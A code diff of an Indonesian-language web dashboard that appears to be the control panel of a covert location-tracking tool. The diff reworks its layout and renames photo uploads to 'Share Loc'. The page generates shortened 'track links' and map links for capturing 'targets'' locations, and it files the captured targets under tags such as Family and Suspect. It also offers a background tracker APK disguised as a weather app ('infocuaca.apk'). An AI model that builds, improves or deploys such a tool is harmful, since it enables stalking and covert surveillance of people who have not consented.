@@ -379,11 +379,12 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
   
   <input id="dashNamaLokasi" class="term-input" placeholder="Nama lokasi (opsional) — Pantai Kuta" style="margin-bottom:8px">
   
-  <div style="display:flex;gap:6px;margin-bottom:8px">
-    <button class="term-btn outline" onclick="dashAmbilLokasiSaya()" style="margin:0;flex:1">
+  <!-- PERBAIKAN TOMBOL CLEAR MENGGUNAKAN GRID -->
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">
+    <button class="term-btn outline" onclick="dashAmbilLokasiSaya()" style="margin:0;width:100%">
       📍 Pakai Lokasi Saya
     </button>
-    <button class="term-btn danger" onclick="dashClearLokasi()" style="margin:0;flex:0 0 auto;padding:0 16px">
+    <button class="term-btn danger" onclick="dashClearLokasi()" style="margin:0;width:100%">
       Clear
     </button>
   </div>
@@ -395,10 +396,66 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 <!-- ═══════════════════════════════════════════════════════════ -->
 
 <div style="font-size:10px;color:var(--text-d);margin:2px 0 8px">› pilih jenis link (auto-shorten via is.gd):</div>
-<section style="padding:16px 0;border-top:1px solid var(--border);margin-top:12px"><div style="color:var(--gold);font-size:11px;margin-bottom:10px">Track Link</div><button class="term-btn outline" onclick="genLink()">Generate Track Link</button><div id="TRACKResult" style="display:none;margin-top:12px"><div id="TRACKLabel" style="font-size:10px;color:var(--text-d);margin-bottom:6px"></div><div class="link-url-box" id="TRACKUrl"></div><button class="term-btn outline" id="TRACKCopy" style="margin-top:10px">📋 Salin Link</button></div></section>
-<section style="padding:16px 0;border-top:1px solid var(--border);margin-top:12px"><div style="color:var(--gold);font-size:11px;margin-bottom:10px">Denah Maps Link</div><button class="term-btn outline" onclick="genLinkMaps()">Generate Maps Link</button><div id="MAPSResult" style="display:none;margin-top:12px"><div id="MAPSLabel" style="font-size:10px;color:var(--text-d);margin-bottom:6px"></div><div class="link-url-box" id="MAPSUrl"></div><button class="term-btn outline" id="MAPSCopy" style="margin-top:10px">📋 Salin Link</button></div></section>
-<section style="padding:16px 0;border-top:1px solid var(--border);margin-top:12px"><div style="color:var(--gold);font-size:11px;margin-bottom:10px">Upload Image</div><button class="term-btn outline" onclick="document.getElementById('dashFotoInput').click()">Upload Foto Biasa</button><div id="FOTOResult" style="display:none;margin-top:12px"><div id="FOTOLabel" style="font-size:10px;color:var(--text-d);margin-bottom:6px"></div><div class="link-url-box" id="FOTOUrl"></div><button class="term-btn outline" id="FOTOCopy" style="margin-top:10px">📋 Salin Link</button></div></section>
-<section style="padding:16px 0;border-top:1px solid var(--border);margin-top:12px"><div style="color:var(--gold);font-size:11px;margin-bottom:10px">Upload Image Pro</div><button class="term-btn outline" onclick="document.getElementById('dashFotoInputVercel').click()">Upload Foto Pro</button><div id="PROResult" style="display:none;margin-top:12px"><div id="PROLabel" style="font-size:10px;color:var(--text-d);margin-bottom:6px"></div><div class="link-url-box" id="PROUrl"></div><button class="term-btn outline" id="PROCopy" style="margin-top:10px">📋 Salin Link</button></div></section><input type="file" id="dashFotoInput" accept="image/*" style="display:none" onchange="onDashFotoPicked(event)"><input type="file" id="dashFotoInputVercel" accept="image/*" style="display:none" onchange="onDashFotoPickedVercel(event)"></div>
+
+<!-- ═══════════════════════════════════════════════════════════
+     GRUP 1: LINK GENERATOR (TRACK & MAPS)
+     ═══════════════════════════════════════════════════════════ -->
+<div style="padding:16px 0;border-top:1px solid var(--border);margin-top:12px">
+  <div style="color:var(--cyan);font-size:11px;font-weight:bold;margin-bottom:12px;letter-spacing:2px;text-transform:uppercase">◈ Link Generator</div>
+  
+  <section style="margin-bottom:16px">
+    <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Track Link</div>
+    <button class="term-btn outline" onclick="genLink()">Generate Track Link</button>
+    <div id="TRACKResult" style="display:none;margin-top:12px">
+      <div id="TRACKLabel" style="font-size:10px;color:var(--text-d);margin-bottom:6px"></div>
+      <div class="link-url-box" id="TRACKUrl"></div>
+      <button class="term-btn outline" id="TRACKCopy" style="margin-top:10px">📋 Salin Link</button>
+    </div>
+  </section>
+
+  <section>
+    <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Denah Maps Link</div>
+    <button class="term-btn outline" onclick="genLinkMaps()">Generate Maps Link</button>
+    <div id="MAPSResult" style="display:none;margin-top:12px">
+      <div id="MAPSLabel" style="font-size:10px;color:var(--text-d);margin-bottom:6px"></div>
+      <div class="link-url-box" id="MAPSUrl"></div>
+      <button class="term-btn outline" id="MAPSCopy" style="margin-top:10px">📋 Salin Link</button>
+    </div>
+  </section>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════
+     GRUP 2: SHARE LOCATION (UPLOAD FOTO)
+     ═══════════════════════════════════════════════════════════ -->
+<div style="padding:16px 0;border-top:1px solid var(--border);margin-top:12px">
+  <div style="color:var(--cyan);font-size:11px;font-weight:bold;margin-bottom:12px;letter-spacing:2px;text-transform:uppercase">◈ Share Location</div>
+  
+  <section style="margin-bottom:16px">
+    <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Share Loc 1</div>
+    <button class="term-btn outline" onclick="document.getElementById('dashFotoInput').click()">Upload Share Loc 1</button>
+    <div id="FOTOResult" style="display:none;margin-top:12px">
+      <div id="FOTOLabel" style="font-size:10px;color:var(--text-d);margin-bottom:6px"></div>
+      <div class="link-url-box" id="FOTOUrl"></div>
+      <button class="term-btn outline" id="FOTOCopy" style="margin-top:10px">📋 Salin Link</button>
+    </div>
+  </section>
+
+  <section>
+    <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Share Loc 2</div>
+    <button class="term-btn outline" onclick="document.getElementById('dashFotoInputVercel').click()">Upload Share Loc 2</button>
+    <div id="PROResult" style="display:none;margin-top:12px">
+      <div id="PROLabel" style="font-size:10px;color:var(--text-d);margin-bottom:6px"></div>
+      <div class="link-url-box" id="PROUrl"></div>
+      <button class="term-btn outline" id="PROCopy" style="margin-top:10px">📋 Salin Link</button>
+    </div>
+  </section>
+</div>
+
+<!-- Hidden File Inputs -->
+<input type="file" id="dashFotoInput" accept="image/*" style="display:none" onchange="onDashFotoPicked(event)">
+<input type="file" id="dashFotoInputVercel" accept="image/*" style="display:none" onchange="onDashFotoPickedVercel(event)">
+
+</div>
 <div class="term-body"><div class="prompt">[Data] Target Location</div><div class="map-box" id="mapLinkBox"><div id="mapLink" class="map-inner"></div><div class="map-label" id="mapLinkLabel">◈ AWAITING TARGET</div><div class="map-coords" id="mapLinkCoords">--, --</div></div><div class="folder-bar" id="folderBar"><button class="folder-chip active" data-folder="all">◈ SEMUA</button><button class="folder-chip" data-folder="untagged">◦ UNTAGGED</button><button class="folder-chip" data-folder="VIP">★ VIP</button><button class="folder-chip" data-folder="Suspect">⚠ SUSPECT</button><button class="folder-chip" data-folder="Client">◆ CLIENT</button><button class="folder-chip" data-folder="Family">♥ FAMILY</button></div><div class="search-row"><input id="searchInput" placeholder="🔍 cari target..." oninput="filterData()"><select id="filterDate" onchange="filterData()"><option value="all">Semua</option><option value="today">Hari Ini</option><option value="7days">7 Hari</option><option value="30days">30 Hari</option></select></div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Showing&nbsp;<b id="countShown" style="color:var(--cyan)">0</b>&nbsp;/&nbsp;<b id="countTotal">0</b></div><div id="dupWarnBox"></div><div id="hasil"><div class="empty">Waiting for data...</div></div><div style="display:flex;gap:8px;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)"><button class="term-btn outline" onclick="exportCSV()" style="margin:0">CSV</button><button class="term-btn outline" onclick="exportJSON()" style="margin:0">JSON</button><button class="term-btn danger" onclick="clearAll()" style="margin:0">Clear</button></div></div>
 <div class="term-body"><div class="prompt">[Monitor] APK Location</div><div class="map-box"><div id="mapApk" class="map-inner"></div><div class="map-label">APK TRACKER</div><div class="map-coords" id="mapApkCoords">--, --</div></div><div class="term-info"><div><span class="k">USER</span><span class="v" id="apkUser">-</span></div><div><span class="k">LAT</span><span class="v" id="apkLat">-</span></div><div><span class="k">LNG</span><span class="v" id="apkLng">-</span></div><div><span class="k">AKURASI</span><span class="v" id="apkAkurasi">-</span></div><div><span class="k">DEVICE</span><span class="v" id="apkDevice">-</span></div><div><span class="k">LAST UPDATE</span><span class="v" id="apkTime">-</span></div></div><button class="term-btn outline" style="margin-top:14px" onclick="bukaMapsApk()">Buka Google Maps</button></div>
 <div class="term-body"><div class="prompt">[Tools] Install Tracker APK</div><div class="term-info"><div><span class="k">FUNCTION</span><span class="v">Lacak HP kamu</span></div><div><span class="k">INTERVAL</span><span class="v">5 menit auto</span></div><div><span class="k">MODE</span><span class="v">Background service</span></div></div><div class="apk-steps"><div>Download file</div><div>Install APK</div><div>Input ID</div><div>Tracking aktif</div></div><a href="https://github.com/roraxbali/official/raw/main/infocuaca.apk" target="_blank" style="text-decoration:none"><button class="term-btn" style="margin-top:6px">Download APK</button></a></div>
